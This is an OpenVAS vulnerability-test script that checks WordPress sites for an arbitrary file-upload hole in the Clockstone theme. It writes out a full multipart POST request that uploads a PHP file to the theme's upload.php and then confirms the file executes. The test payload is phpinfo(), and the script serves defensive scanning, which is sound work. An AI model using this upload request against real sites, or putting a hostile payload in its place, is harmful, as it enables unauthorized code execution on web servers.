###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_clockstone_shell_12_2012.nasl 3911 2016-08-30 13:08:37Z mime $
#
# WordPress Clockstone Theme Arbitrary File Upload Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "The Clockstone Theme for WordPress is prone to an arbitrary file-
upload vulnerability.

An attacker can exploit this issue to upload arbitrary PHP code and
run it in the context of the Web server process. This may
facilitate unauthorized access or privilege escalation; other
attacks are also possible.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103626";
CPE = "cpe:/a:wordpress:wordpress";

if (description)
{
 script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/118930/WordPress-Clockstone-Theme-File-Upload.html");
 script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/download/118930/clockstone-shell.pdf");
 script_oid(SCRIPT_OID);
 script_version ("$Revision: 3911 $");
 script_tag(name:"cvss_base", value:"9.7");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:P");

 script_name("WordPress Clockstone Theme Arbitrary File Upload Vulnerability");
 script_tag(name:"last_modification", value:"$Date: 2016-08-30 15:08:37 +0200 (Tue, 30 Aug 2016) $");
 script_tag(name:"creation_date", value:"2012-12-19 12:55:53 +0100 (Wed, 19 Dec 2012)");
 script_summary("Determine if it is possible to upload a file");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("secpod_wordpress_detect_900182.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_mandatory_keys("wordpress/installed");
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

url = dir + '/wp-content/themes/clockstone/theme/functions/upload.php';
host = get_host_name();

filename = 'openvas_' + rand() + '.php';
len = 363 + strlen(filename);

req = 'POST ' + url + ' HTTP/1.1\r\n' +
      'Host: ' + host + '\r\n' +
      'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1\r\n' + 
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
      'Accept-Language: de-de,de;q=0.8,en-us;q=0.5,en;q=0.3\r\n' + 
      'Accept-Encoding: gzip, deflate\r\n' +
      'DNT: 1\r\n' + 
      'Connection: keep-alive\r\n' +
      'Content-Type: multipart/form-data; boundary=---------------------------176193263217941195551884621959\r\n' + 
      'Content-Length: ' + len + '\r\n' + 
      '\r\n' + 
      '-----------------------------176193263217941195551884621959\r\n' + 
      'Content-Disposition: form-data; name="url"\r\n' + 
      '\r\n' +
      './\r\n' +
      '-----------------------------176193263217941195551884621959\r\n' + 
     'Content-Disposition: form-data; name="uploadfile"; filename="' + filename  + '"\r\n' + 
     'Content-Type: application/x-download\r\n' + 
     '\r\n' +
     '<?php\r\n' + 
     ' phpinfo();\r\n' +
     '?>\r\n' +
     '\r\n' +
     '-----------------------------176193263217941195551884621959--\r\n';

res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);

if(res =~ "HTTP/1\.. 200" && uploaded = eregmatch(pattern:"([a-f0-9]{32}\.php)", string:res)) {

  if(isnull(uploaded[1]))exit(0);

  file = uploaded[1];

  url = dir + '/wp-content/themes/clockstone/theme/functions/' + file;

  if(http_vuln_check(port:port, url:url,pattern:"<title>phpinfo\(\)")) {
    desc = 'It was possible to upload and execute the file ' + file + ' to ' + dir + '/wp-content/themes/clockstone/theme/functions/.\nPlease delete this file.\n';
    security_message(port:port,data:desc);
    exit(0);
  }
}

exit(0);
